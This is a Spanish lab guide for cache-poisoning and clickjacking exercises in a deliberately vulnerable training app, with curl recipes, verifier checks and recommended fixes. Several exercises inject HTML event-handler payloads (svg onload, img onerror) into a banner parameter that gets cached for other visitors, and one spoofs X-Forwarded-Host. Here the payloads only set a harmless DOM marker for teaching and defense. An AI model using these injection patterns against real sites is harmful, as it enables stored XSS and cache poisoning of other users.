Es una vulnerabilidad de clave de caché y también una reflexión HTML/XSS en el cuerpo. Para la demostración segura se debe usar un marcador DOM benigno que solo escriba document.body.dataset.vaLab='VA_LAB_OK'; nunca usar document.cookie, exfiltración o navegación a terceros. La reflexión de una cadena o un 200 por sí solos no prueban ejecución XSS.

#### `GET /VulnerableApp/CachePoisoning/LEVEL_2`

**Entrada:** {
  "query": {
    "banner": "Opcional; se eliminan bloques/etiquetas script y el texto javascript: mediante expresiones regulares, pero se conserva HTML como <b> o un manejador de evento.",
    "browserCache": "Opcional, por defecto true; selecciona la directiva pública del navegador, pero la entrada sigue guardándose en la caché compartida.",
    "clave_de_cache": "No es un parámetro HTTP: solo requestURI, /VulnerableApp/CachePoisoning/LEVEL_2."
  },
  "headers": {},
  "cookies": {}
}

applyNaiveBannerFilter elimina únicamente patrones obvios de script y el esquema javascript:. La respuesta filtrada se almacena con la misma clave solo-de-ruta que en L1. Un HTML inofensivo puede persistir para el siguiente visitante; un atributo de evento como el marcador DOM benigno queda fuera del filtro y se refleja en la entrada cacheada.

El test confirma que <script>alert(1)</script> desaparece, que <b>...</b> sobrevive y que <img src=x onerror=...> sobrevive. No se debe usar alert, cookies ni enlaces de phishing para verificarlo. El hecho de que el filtro quite una etiqueta no demuestra que la salida sea segura.

#### `GET /VulnerableApp/CachePoisoning/LEVEL_3`

**Entrada:** {
  "query": {
    "banner": "Opcional; se normaliza con trim, se escapa para HTML y sí participa en la clave como |banner=VALOR.",
    "browserCache": "Opcional, por defecto true; solo controla Cache-Control público del navegador.",
    "clave_de_cache": "requestURI + |banner=normalizeBanner(banner); X-Forwarded-Host no participa."
  },
  "headers": {
    "X-Forwarded-Host": "Opcional; el servidor lo acepta sin validación para formar https://HOST/assets/cache-poisoning-demo.js. En el laboratorio usar exclusivamente receiver:8081.",
    "cookies": "No intervienen."
  }
}

buildLevel3Response escapa banner, inserta el activo en un enlace y en un iframe, y usa resolveUntrustedForwardedHost. El atacante puede llenar la caché para una clave URI+banner con una URL de activo basada en X-Forwarded-Host; la petición posterior sin el header obtiene la misma URL si repite exactamente el banner. Si cambia el banner, la clave cambia y el test espera MISS. El código no realiza fetch, DNS, conexión ni lectura del host indicado.

La prueba segura usa X-Forwarded-Host: receiver:8081, que es el único receptor local autorizado. Como la implementación antepone https://, el receptor HTTP puede no completar una carga TLS; esto no invalida la evidencia de que la URL fue construida y cacheada. No usar dominios externos, IPs internas arbitrarias ni payloads de SSRF/RFI.

#### `GET /VulnerableApp/CachePoisoning/LEVEL_4`

**Entrada:** {
  "query": {
    "browserCache": "Opcional, por defecto true; la respuesta siempre se marca pública en este nivel.",
    "banner": "No existe en el método Level 4 y se ignora si se envía."
  },
  "headers": {
    "Cookie": "demo_user=VALOR opcional. Si falta, se usa guest. El valor solo debe ser un identificador sintético de laboratorio, por ejemplo va_lab_user.",
    "X-Forwarded-Host": "No interviene en este nivel."
  }
}

resolveDemoUser lee demo_user y buildLevel4ResponseForUser genera usuario, email derivado VALOR@vulnerableapp.local y una IP determinista 10.a.b.42. La respuesta se publica como public, max-age=60 y se guarda con requestURI solamente. Por tanto, la primera identidad que llena la entrada puede aparecer en una petición posterior sin cookie.

Es una demostración de exposición de contenido personalizado por política de caché, no un IDOR. Todos los datos utilizados en los ejercicios son sintéticos y derivados por el código; no se deben introducir secretos o datos reales. Un HTTP 200 no prueba IDOR ni fuga: hay que demostrar que un segundo contexto recibe el marcador del primer contexto y que la clave no contiene la cookie.

#### `GET /VulnerableApp/CachePoisoning/LEVEL_5`

**Entrada:** {
  "query": {
    "banner": "Opcional; se normaliza y se escapa como HTML.",
    "browserCache": "No es un parámetro del método Level 5."
  },
  "headers": {
    "Cookie": "demo_user=VALOR opcional y sintético.",
    "X-Forwarded-Host": "Se ignora para el activo; el host queda fijo en static.vulnerableapp.local."
  }
}

La variante anotada Variant.SECURE genera contenido personalizado escapado, usa siempre https://static.vulnerableapp.local/assets/cache-poisoning-demo.js y llama a buildCachedResponse con private, no-store y storeInSharedCache=false. Cada petición responde MISS y no reutiliza la respuesta anterior en el mapa estático.

Es el control positivo de la corrección dentro de la familia: el cuerpo puede variar legítimamente con demo_user, pero no debe cruzar usuarios; el banner debe aparecer como entidades HTML y el header no confiable no debe cambiar el host. La política privada es una defensa de caché, no una garantía sobre proxies externos no controlados.

### cachePoisoning-01 · Restablecer una sola entrada de caché antes de una repetición

HTTP 200 con JSON válido, X-Cache-Status: -, X-Cache-Key: - y una respuesta por defecto del nivel pedido. La operación solo elimina entradas cuyo prefijo corresponde al nivel indicado; no limpia los demás niveles.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El endpoint es el mecanismo de aislamiento que usa el propio test. Debe ejecutarse antes de comparar MISS/HIT para que una entrada de una corrida anterior no contamine la observación. Un check con '-' solo verifica la respuesta especial de limpieza, no demuestra por sí mismo que todas las instancias o proxies externos estén vacíos.

Ejecutar desde Kali: curl -i -X POST http://target:9090/VulnerableApp/CachePoisoning/clearCache --data-urlencode 'level=LEVEL_1'

Repetir con level=LEVEL_2, LEVEL_3, LEVEL_4 o LEVEL_5 cuando corresponda al ejercicio; conservar la salida para inspeccionar X-Cache-Status y X-Cache-Key.

Registrar la misma prueba con el cliente del laboratorio:
lab request cachePoisoning-01 --method POST --body level=LEVEL_1 --content-type application/x-www-form-urlencoded

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Preparación del laboratorio: limpiar caché no es resolver un objetivo."
}
```

**Pistas:**

No añadas cookies ni X-Forwarded-Host a la limpieza.

Si la aplicación se reinició, el mapa estático también empieza vacío, pero limpiar explícitamente hace el procedimiento reproducible.

**Corrección recomendada:** En producción, la invalidación debe estar protegida y coordinada con toda la capa de caché. La aplicación no debería exponer un borrado sin autorización.

### cachePoisoning-02 · LEVEL_1: envenenar una respuesta por ruta y observar el HIT del visitante

Después de limpiar LEVEL_1, la primera solicitud debe mostrar X-Cache-Status: MISS, X-Cache-Key: /VulnerableApp/CachePoisoning/LEVEL_1, Cache-Control: public, max-age=60 y el marcador VA_LAB_L1_MARKER en content. La segunda, sin banner, debe mostrar HIT y conservar el mismo marcador.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La primera llamada representa al emisor que llena la entrada; la segunda representa a otro visitante. El check de header se aplica a la segunda salida, mientras que el cuerpo y X-Cache-Key deben revisarse manualmente o con un parser JSON sobre la propiedad content. Un HIT más el marcador repetido es evidencia de reutilización de contenido; no es una prueba de ejecución JavaScript.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request cachePoisoning-02 --method GET --param banner=VA_LAB_L1_MARKER --param browserCache=true
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "all",
  "checks": [
    {
      "kind": "header",
      "header": "X-Cache-Status",
      "value": "HIT"
    },
    {
      "kind": "contains",
      "path": "content",
      "value": "VA_LAB_L1_MARKER"
    }
  ]
}
```

**Pistas:**

La clave esperada no contiene banner ni la cadena VA_LAB_L1_MARKER.

La caché de la aplicación tiene TTL de 60 segundos; limpiar antes de la primera llamada evita depender de una entrada anterior.

**Corrección recomendada:** Incluir en la clave cada entrada que cambie la representación, o no hacer pública una respuesta que dependa de entrada no indexada. Escapar la salida HTML con un contexto apropiado y usar una política CSP como defensa adicional.

### cachePoisoning-03 · LEVEL_1: control negativo cambiando banner con la misma ruta

Tras limpiar, la petición con VA_LAB_FIRST debe ser MISS. La petición posterior con VA_LAB_SECOND debe ser HIT, conservar VA_LAB_FIRST en content y no contener VA_LAB_SECOND. Ambas deben informar exactamente la misma clave de ruta.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este control separa el efecto de caché del valor concreto del primer payload: si cambiar el query no cambia la clave, la segunda respuesta sigue siendo la primera. El check de contenido se aplica a la segunda respuesta; también debe verificarse su header X-Cache-Status: HIT. No utilizar datos falsos de soporte, phishing ni órdenes para este control.

Limpiar: curl -i -X POST http://target:9090/VulnerableApp/CachePoisoning/clearCache --data-urlencode 'level=LEVEL_1'

Primera variante: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_1 --data-urlencode 'banner=VA_LAB_FIRST'

Segunda variante: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_1 --data-urlencode 'banner=VA_LAB_SECOND'

En la última salida, comprobar que aparece VA_LAB_FIRST, que no aparece VA_LAB_SECOND, que X-Cache-Status es HIT y que X-Cache-Key sigue siendo /VulnerableApp/CachePoisoning/LEVEL_1.

Registrar la misma prueba con el cliente del laboratorio:
lab request cachePoisoning-03 --method GET --param primer_banner=VA_LAB_FIRST --param segundo_banner=VA_LAB_SECOND

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar dos valores de banner siguiendo los comandos; la receta describe dos solicitudes, no una."
}
```

**Pistas:**

No confundas la ausencia del segundo marcador con filtrado: la respuesta completa proviene de la entrada anterior.

Repite la prueba después de limpiar para distinguir una entrada nueva de una entrada ya existente.

**Corrección recomendada:** Usar una clave que incluya la representación normalizada de banner cuando realmente deba cachearse, o no reflejar entrada controlada por el usuario en una respuesta compartida.

### cachePoisoning-04 · LEVEL_1: marcador DOM benigno reflejado y almacenado, sin cookies

La respuesta del atacante y la repetición sin banner contienen la cadena VA_LAB_OK dentro del HTML cacheado. Solo en un navegador de laboratorio, si se decide hacer la comprobación manual, el efecto esperado es document.body.dataset.vaLab igual a VA_LAB_OK; no hay lectura ni envío de cookies.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El payload usa un marcador de DOM sin alertas, sin document.cookie y sin red. El servidor de L1 no escapa banner, por lo que el HTML se guarda tal cual y se repite al visitante. El verificador honesto distingue tres hechos: cadena reflejada, cadena persistida por HIT y ejecución en un navegador; solo el último requiere revisión manual y nunca debe puntuarse por un click.

Limpiar: curl -i -X POST http://target:9090/VulnerableApp/CachePoisoning/clearCache --data-urlencode 'level=LEVEL_1'

Enviar únicamente el marcador DOM seguro: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_1 --data-urlencode "banner=</p><svg onload=\"document.body.dataset.vaLab='VA_LAB_OK'\"></svg>"

Repetir como visitante sin banner: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_1

Comprobar por texto que el segundo content tiene VA_LAB_OK y X-Cache-Status: HIT. Solo si se requiere una revisión manual, abrir la ruta en un navegador aislado y observar el atributo DOM; no hacer click para otorgar puntaje ni usar cookies.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Revisar el segundo body para comprobar que contiene VA_LAB_OK; la ejecución solo se puede confirmar manualmente observando document.body.dataset.vaLab=VA_LAB_OK en un navegador aislado. La reflexión por curl no prueba ejecución XSS."
}
```

**Pistas:**

El check de curl puede demostrar bytes en la respuesta, no que el navegador los interprete.

Si el navegador conserva una respuesta local, deshabilitar su caché o usar una sesión nueva; la prueba del servidor sigue siendo X-Cache-Status y X-Cache-Key.

**Corrección recomendada:** Aplicar escape HTML contextual antes de insertar datos en markup, evitar innerHTML para datos no confiables y acompañar con CSP y una clave/política de caché correcta.

### cachePoisoning-05 · LEVEL_2: filtro superficial no impide HTML benigno en la entrada compartida

La primera respuesta debe ser MISS y conservar <b>VA_LAB_FILTERED</b>; la segunda, sin banner, debe ser HIT y conservar el mismo fragmento. La clave debe ser solo /VulnerableApp/CachePoisoning/LEVEL_2. El método elimina etiquetas script obvias, pero no este HTML.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este ejercicio separa el fallo de la clave de caché del filtro. El marcador no es phishing ni código ejecutable, pero demuestra que la salida HTML controlada persiste para otra petición. Verificar además en content que la etiqueta b sobrevive y que el cache key no incluye banner.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request cachePoisoning-05 --method GET --param 'banner=<b>VA_LAB_FILTERED</b>' --param browserCache=true
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "all",
  "checks": [
    {
      "kind": "header",
      "header": "X-Cache-Status",
      "value": "HIT"
    },
    {
      "kind": "contains",
      "path": "content",
      "value": "VA_LAB_FILTERED"
    }
  ]
}
```

**Pistas:**

El test fuente confirma que los bloques script y el esquema javascript: se eliminan, pero <b> queda.

Un filtro que elimina un patrón no repara una clave de caché que sigue ignorando banner.

**Corrección recomendada:** No usar listas negras de etiquetas como control principal. Escapar o sanitizar con una política permitida y, sobre todo, hacer coincidir la política de compartición con las entradas que realmente determinan el cuerpo.

### cachePoisoning-06 · LEVEL_2: bypass seguro del filtro con un marcador DOM local

La salida de la primera solicitud y la repetición cacheada deben contener VA_LAB_OK y el atributo onerror porque el filtro no lo elimina. Una comprobación de navegador aislado puede observar el marcador DOM, nunca cookies, red ni alertas.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La finalidad didáctica es mostrar el límite de la expresión regular, no ejecutar una acción peligrosa. El atributo solo escribe un valor fijo en el DOM. Como el body se inserta mediante innerHTML en la plantilla común, un navegador podría interpretar el evento; esa parte no se afirma a partir de curl y no debe verificarse con document.cookie.

Limpiar: curl -i -X POST http://target:9090/VulnerableApp/CachePoisoning/clearCache --data-urlencode 'level=LEVEL_2'

Enviar el marcador benigno: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_2 --data-urlencode "banner=<img src=x onerror=\"document.body.dataset.vaLab='VA_LAB_OK'\">"

Repetir sin banner: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_2

Verificar bytes y headers en la segunda salida. La revisión manual, si se hace, debe limitarse al marcador DOM en una sesión aislada y nunca al click de un botón o a una cookie.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Confirmar por curl que VA_LAB_OK aparece en el segundo content y X-Cache-Status es HIT; la ejecución del manejador solo se puede confirmar manualmente con document.body.dataset.vaLab=VA_LAB_OK. No tratar la reflexión como prueba de ejecución."
}
```

**Pistas:**

No uses alert(1), alert(document.cookie), fetch ni imágenes que apunten fuera del laboratorio.

El parámetro javascript: sí se elimina, pero un evento HTML no; esto ilustra por qué la lista negra no es una sanitización completa.

**Corrección recomendada:** Eliminar la inserción de HTML no confiable, usar textContent o un sanitizer de allow-list y ajustar la caché para que no comparta contenido dependiente de la entrada. Una CSP sin inline handlers reduce defensa en profundidad, pero no sustituye el escape.

### cachePoisoning-07 · LEVEL_3: encabezado no indexado usando exclusivamente el receptor local

Tras limpiar, el primer request debe ser MISS y construir https://receiver:8081/assets/cache-poisoning-demo.js con X-Cache-Key /VulnerableApp/CachePoisoning/LEVEL_3|banner=VA_LAB_SHARED_HOST. El segundo request, sin header pero con el mismo banner, debe ser HIT y conservar la URL del receptor local. La observación demuestra que el header no participa en la clave; no demuestra SSRF.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La clave del nivel 3 sí distingue banner, pero omite X-Forwarded-Host. El servidor almacena el HTML generado con el host recibido y lo devuelve para la misma clave. Se usa receiver:8081 en vez de un dominio o IP externo. El código construye un enlace/iframe; no realiza la conexión, por lo que cualquier carga del receptor depende del navegador y del esquema https generado.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request cachePoisoning-07 --method GET --param banner=VA_LAB_SHARED_HOST --param browserCache=true --header X-Forwarded-Host=receiver:8081
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "all",
  "checks": [
    {
      "kind": "header",
      "header": "X-Cache-Status",
      "value": "HIT"
    },
    {
      "kind": "contains",
      "path": "content",
      "value": "https://receiver:8081/assets/cache-poisoning-demo.js"
    }
  ]
}
```

**Pistas:**

El header es enviado solo en el primer curl; no se necesita una cookie.

Si se necesita observar tráfico, limitarse al receptor local autorizado; el resultado esencial ya está en el cuerpo y en X-Cache-Key.

**Corrección recomendada:** No confiar en X-Forwarded-Host recibido directamente; establecer el host desde una configuración confiable o una allow-list y añadir todos los encabezados que alteren el cuerpo o la URL a la clave/Vary. Para un activo fijo, ignorar el header como hace L5.

### cachePoisoning-08 · LEVEL_3: control positivo de la clave cambiando banner

La primera solicitud debe ser MISS con clave terminada en |banner=VA_LAB_BANNER_A. La segunda, al cambiar el banner, debe ser MISS con clave terminada en |banner=VA_LAB_BANNER_B y debe usar el host por defecto cdn.vulnerableapp.local, no el host cacheado de la primera entrada.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este contraste evita atribuir todo el comportamiento a X-Forwarded-Host: banner sí es parte de la clave en L3. La vulnerabilidad queda acotada al caso donde se conserva el mismo banner pero cambia un header que sí cambia el cuerpo.

Limpiar: curl -i -X POST http://target:9090/VulnerableApp/CachePoisoning/clearCache --data-urlencode 'level=LEVEL_3'

Primera clave: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_3 -H 'X-Forwarded-Host: receiver:8081' --data-urlencode 'banner=VA_LAB_BANNER_A'

Segunda clave: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_3 --data-urlencode 'banner=VA_LAB_BANNER_B'

Verificar MISS en la segunda respuesta, X-Cache-Key con B y host por defecto cdn.vulnerableapp.local.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "MISS"
}
```

**Pistas:**

No reutilices el mismo banner en este control: el cambio debe aislar la dimensión que sí está indexada.

El host por defecto procede de DEFAULT_UNTRUSTED_HOST cuando falta el header; no es un receptor externo para la prueba.

**Corrección recomendada:** Mantener la clave coherente con todos los factores de representación y validar o ignorar encabezados de forwarding según la topología de confianza.

### cachePoisoning-09 · LEVEL_4: demostrar fuga de un identificador sintético personalizado entre solicitudes

Después de limpiar LEVEL_4, el primer request debe ser MISS, Cache-Control public, max-age=60 y contener va_lab_user, va_lab_user@vulnerableapp.local y una IP derivada 10.a.b.42. El segundo request sin cookie debe ser HIT con el mismo contenido personalizado, aunque su contexto no envía demo_user; X-Cache-Key debe ser solo la ruta.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La cookie modifica el cuerpo pero no la clave. El segundo request es la comprobación de cruce de contexto: debe inspeccionarse su JSON content para encontrar el marcador sintético del primer request y su email derivado. No se trata de un IDOR y no basta con un 200; la evidencia es cookie ausente más HIT más datos sintéticos del primer contexto.

Limpiar: curl -i -X POST http://target:9090/VulnerableApp/CachePoisoning/clearCache --data-urlencode 'level=LEVEL_4'

Llenar con una identidad ficticia: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_4 --cookie 'demo_user=va_lab_user' --data-urlencode 'browserCache=true'

Solicitar como visitante sin cookie: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_4 --data-urlencode 'browserCache=true'

En la segunda salida, comprobar HIT, la ausencia de Cookie enviada por el comando, va_lab_user y va_lab_user@vulnerableapp.local en content. No introducir nombres, emails o secretos reales.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "HIT"
}
```

**Pistas:**

La IP se deriva de SHA-256 del valor y no es una lectura de red; no hace falta calcularla para demostrar el cruce.

La clave esperada no contiene demo_user ni su valor.

**Corrección recomendada:** Marcar contenido personalizado como private, no-store, usar Vary: Cookie cuando sea apropiado y/o aislar la caché por identidad segura. No publicar respuestas con PII en una caché compartida por ruta.

### cachePoisoning-10 · LEVEL_4: contraste de orden de llenado con el valor guest

Tras limpiar, la primera petición sin cookie debe llenar guest con MISS. La segunda petición con demo_user=va_lab_other debe ser HIT y seguir mostrando guest en vez de va_lab_other. Esto es un control de orden, no una mitigación: confirma que la primera respuesta domina la entrada compartida.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El contraste es útil para no confundir la dirección de la filtración: quien llena primero decide el contenido que reciben las siguientes solicitudes. El check de contenido debe aplicarse a la segunda salida junto con X-Cache-Status: HIT; la cookie del segundo request no fuerza una recomputación.

Limpiar: curl -i -X POST http://target:9090/VulnerableApp/CachePoisoning/clearCache --data-urlencode 'level=LEVEL_4'

Llenar como invitado: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_4

Pedir con otro identificador sintético: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_4 --cookie 'demo_user=va_lab_other'

Comprobar que la última respuesta es HIT y conserva guest; no tratar este resultado como una autorización correcta ni como IDOR.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "guest"
}
```

**Pistas:**

Limpia antes de invertir el orden; si no, una entrada anterior puede ocultar el contraste.

La cookie demo_user no llega a la clave aunque sí llega al método Java.

**Corrección recomendada:** La misma que en el ejercicio anterior: no cachear públicamente cuerpos dependientes de cookie, o incluir de forma segura la dimensión de identidad en una política de caché bien diseñada.

### cachePoisoning-11 · LEVEL_5: control positivo seguro con host ignorado, escape y no-store

La respuesta personalizada debe informar Cache-Control: private, no-store y X-Cache-Status: MISS; el body JSON content debe contener &lt;b&gt;VA_LAB_SAFE&lt;/b&gt;, va_lab_admin y https://static.vulnerableapp.local/assets/cache-poisoning-demo.js, y no debe contener receiver:8081. Una segunda petición sin cookie y sin header también debe ser MISS, mostrar guest y no mostrar va_lab_admin.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

L5 reúne los controles positivos de la familia. El header de forwarding local no puede cambiar el host fijo, el banner se escapa, y storeInSharedCache=false hace que cada llamada tenga MISS en este mapa. El check de política debe acompañarse de inspección de body y de una segunda solicitud sin cookie; no prometer que un proxy externo respetará la política sin observarlo.

Enviar una solicitud personalizada con valores sintéticos y solo el receptor autorizado: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_5 -H 'X-Forwarded-Host: receiver:8081' --cookie 'demo_user=va_lab_admin' --data-urlencode 'banner=<b>VA_LAB_SAFE</b>'

Solicitar como guest, sin cookie ni header: curl -i --get http://target:9090/VulnerableApp/CachePoisoning/LEVEL_5

Comprobar en ambas salidas X-Cache-Status: MISS; en la primera, private, no-store, entidades &lt;b&gt;...&lt;/b&gt;, va_lab_admin y static.vulnerableapp.local; en la segunda, guest y ausencia de va_lab_admin.

No usar receiver para intentar una conexión desde el servidor: este nivel, igual que L3, solo devuelve HTML y headers; el objetivo es verificar que el valor no altera el resultado.

Registrar la misma prueba con el cliente del laboratorio:
lab request cachePoisoning-11 --method GET --param 'banner=<b>VA_LAB_SAFE</b>' --header Cookie=demo_user=va_lab_admin --header X-Forwarded-Host=receiver:8081

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "private, no-store",
  "header": "Cache-Control"
}
```

**Pistas:**

El X-Cache-Key puede aparecer como /VulnerableApp/CachePoisoning/LEVEL_5|private-response, pero la entrada no se almacena aunque se emita ese diagnóstico.

No hace falta llamar a clearCache para L5, pero hacerlo no perjudica el control y ayuda a mantener la corrida aislada.

**Corrección recomendada:** Mantener private, no-store para contenido personalizado, escapar por contexto, ignorar headers no confiables y aplicar controles de caché en el proxy/CDN. Si se desea cachear, diseñar explícitamente la clave y la política de variación.

### Límites de esta familia

[
  "Este documento es una verificación estática del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y de su test específico; no afirma que los ejercicios hayan sido ejecutados con éxito contra target:9090.",
  "La caché observada es un ConcurrentHashMap estático dentro de una instancia JVM, con TTL de 60 segundos. Un reinicio, varias réplicas, un proxy delante de la aplicación o una política de navegador pueden producir MISS/HIT distintos. X-Cache-Status y X-Cache-Key son headers diagnósticos generados por la aplicación, no una prueba completa del comportamiento de un CDN real.",
  "Un reflejo de texto, la presencia de HTML en JSON o un HTTP 200 no prueban ejecución XSS. La única comprobación manual sugerida usa el marcador fijo document.body.dataset.vaLab=VA_LAB_OK, sin cookies, alertas, red ni clicks; no se debe atribuir puntaje por hacer click.",
  "En general, un HTTP 200 no prueba IDOR. Para L4 la prueba debe demostrar un cambio de contexto: segundo request sin Cookie, X-Cache-Status HIT, misma clave de ruta y marcador sintético del primer usuario. No se deben introducir secretos ni datos personales reales.",
  "L3 no implementa SSRF, RFI ni una lectura remota: buildAssetUrl solo concatena https:// con el header y lo inserta en HTML. Las demostraciones usan exclusivamente receiver:8081; el esquema https generado puede no ser compatible con un receptor HTTP y no se debe suplir esa limitación con hosts externos.",
  "El endpoint clearCache se documenta como ayuda de laboratorio y no como control de acceso. Limpia solo claves que empiezan por el prefijo del nivel indicado; no invalida caches intermedias ni otros procesos.",
  "El nivel 5 es un control positivo a nivel de código: garantiza private, no-store, host fijo, escape y storeInSharedCache=false en esta implementación, pero no garantiza que una infraestructura externa mal configurada respete o no sobrescriba sus headers.",
  "No se utilizaron Mailpit ni otros receptores porque esta familia no envía correo. Ningún ejercicio requiere comandos externos peligrosos, reverse shells, lectura de secretos del host, DoS, borrado de datos o contacto con dominios de terceros."
]

## Secuestro de clics y protección de marcos

Clickjacking es el engaño de interfaz por el que una página víctima se carga en un iframe y una interfaz del atacante hace que el usuario active controles de la víctima sin saberlo. En este commit la familia enseña la defensa mediante X-Frame-Options y Content-Security-Policy frame-ancestors. La clase ClickjackingVulnerability expone siete rutas GET bajo /VulnerableApp/ClickjackingVulnerability/LEVEL_n. Los niveles 1, 2, 3, 6 y 7 están marcados por el código y sus pruebas como no seguros; los niveles 4 y 5 tienen Variant.SECURE. La respuesta HTTP es un GenericVulnerabilityResponseBean con content e isValid; isValid=true es un campo del laboratorio y no debe interpretarse como un veredicto de seguridad.

### Todos los niveles originales

#### `GET /VulnerableApp/ClickjackingVulnerability/LEVEL_1`

**Entrada:** {
  "query": {},
  "path": {},
  "body": {}
}

noFramingProtection devuelve 200 y no añade X-Frame-Options ni Content-Security-Policy. El cuerpo es {"content":"Page loaded without framing protection. This page can be embedded in an iframe.","isValid":true}. La plantilla LEVEL_1 coloca esta URL en un iframe y describe que cualquier origen puede intentar incrustarla.

@VulnerableAppRequestMapping usa value=LevelConstants.LEVEL_1, htmlTemplate=LEVEL_1/ClickjackingVulnerability y el método por defecto GET. @AttackVector describe CLICKJACKING_NO_FRAMING_PROTECTION y el recurso de payload dice que no aplica. La ausencia de cabeceras se observa en HTTP, pero curl no prueba por sí solo el comportamiento del navegador.

#### `GET /VulnerableApp/ClickjackingVulnerability/LEVEL_2`

**Entrada:** {
  "query": {},
  "path": {},
  "body": {}
}

xFrameOptionsAllowAll devuelve 200 con X-Frame-Options: ALLOWALL y sin Content-Security-Policy. El cuerpo sigue siendo el mensaje de página sin protección. El código trata ALLOWALL como permiso explícito para cualquier origen, equivalente a no protección.

@AttackVector describe CLICKJACKING_X_FRAME_OPTIONS_ALLOWALL y el payload de propiedades es un iframe sencillo. ALLOWALL no es el valor estándar habitual de X-Frame-Options; por ello la evidencia reproducible es la cabecera que emite este commit y la interpretación final debe comprobarse en el navegador objetivo, no inferirse de un 200.

#### `GET /VulnerableApp/ClickjackingVulnerability/LEVEL_3`

**Entrada:** {
  "query": {},
  "path": {},
  "body": {}
}

xFrameOptionsSameOrigin devuelve 200 con X-Frame-Options: SAMEORIGIN y sin CSP. Un navegador debe impedir un ancestro de otro origen, pero permite el framing del mismo origen; la propia UI carga la URL desde /VulnerableApp y por eso el nivel ilustra esa limitación.

@AttackVector describe CLICKJACKING_X_FRAME_OPTIONS_SAMEORIGIN. El test de la familia agrupa el nivel 3 entre los vulnerables porque el requisito del laboratorio considera insuficiente SAMEORIGIN cuando un atacante puede operar en el mismo origen. La cabecera por sí sola no demuestra que exista un atacante same-origin ni que se haya ejecutado una acción.

#### `GET /VulnerableApp/ClickjackingVulnerability/LEVEL_4`

**Entrada:** {
  "query": {},
  "path": {},
  "body": {}
}

xFrameOptionsDeny devuelve 200 con X-Frame-Options: DENY y sin CSP. El cuerpo cambia a {"content":"Page loaded with framing protection header set.","isValid":true}. La plantilla LEVEL_1 informa que el navegador debe rechazar la carga en cualquier iframe.

La anotación de ruta usa variant=Variant.SECURE y htmlTemplate=LEVEL_1/ClickjackingVulnerability. En la implementación no hay @AttackVector ni @ChallengeCard para este nivel, pero sí existe la ruta y el test exige DENY. Es un control positivo de cabecera, no una garantía universal frente a navegadores o proxies mal configurados.

#### `GET /VulnerableApp/ClickjackingVulnerability/LEVEL_5`

**Entrada:** {
  "query": {},
  "path": {},
  "body": {}
}

cspFrameAncestorsNone devuelve 200 con Content-Security-Policy: frame-ancestors 'none' y sin X-Frame-Options. El cuerpo es el mensaje de protección activa. La plantilla LEVEL_1 presenta frame-ancestors 'none' como la defensa moderna contra todo framing.

La anotación de ruta usa variant=Variant.SECURE y htmlTemplate=LEVEL_1/ClickjackingVulnerability. El test exige exactamente el directorio frame-ancestors 'none'. No se debe concluir a partir de un 200 que el iframe cargó: la comprobación correcta es la política de respuesta y, como confirmación separada, el comportamiento de un navegador.

#### `GET /VulnerableApp/ClickjackingVulnerability/LEVEL_6`

**Entrada:** {
  "query": {},
  "path": {},
  "body": {}
}

overlayAttackNoProtection devuelve 200 sin X-Frame-Options ni CSP y usa la plantilla LEVEL_4. Esa plantilla muestra una falsa caja de premio y un iframe víctima casi transparente. El CSS deja pointer-events:none en el iframe y pointer-events:all en la capa falsa; el JavaScript del overlay dispara un GET Ajax a la misma URL cuando se pulsa la capa falsa. El endpoint no recibe parámetros y solo devuelve el mensaje didáctico estático.

@AttackVector describe CLICKJACKING_OVERLAY_NO_PROTECTION. La demostración representa el impacto de un overlay, pero el código observado no hace que el iframe reciba el clic: la capa falsa captura el evento y llama directamente a doGetAjaxCall. Por eso un curl puede verificar la falta de cabeceras, no una acción de usuario ni una sesión autenticada.

#### `GET /VulnerableApp/ClickjackingVulnerability/LEVEL_7`

**Entrada:** {
  "query": {},
  "path": {},
  "body": {}
}

